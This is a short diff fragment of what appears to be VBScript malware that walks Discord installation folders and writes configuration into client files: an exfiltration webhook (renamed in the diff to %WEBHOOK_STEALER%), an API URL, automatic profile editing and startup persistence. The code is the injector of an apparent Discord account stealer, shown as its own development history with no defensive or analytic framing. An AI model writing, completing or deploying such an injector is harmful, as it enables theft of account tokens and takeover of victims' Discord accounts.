@@ -73,7 +73,7 @@ For Each folder In discordDirectories
                                                     fileContent = textFile.ReadAll
                                                     textFile.Close
                                                     
-                                                    fileContent = Replace(fileContent, "%WEBHOOK_URL%", webhook_url)
+                                                    fileContent = Replace(fileContent, "%WEBHOOK_STEALER%", webhook_url)
                                                     fileContent = Replace(fileContent, "%API_URL%", api_url)
                                                     fileContent = Replace(fileContent, "%AUTO_USER_PROFILE_EDIT%", auto_user_profile_edit)
                                                     fileContent = Replace(fileContent, "%AUTO_PERSIST_STARTUP%", auto_persist_startup)
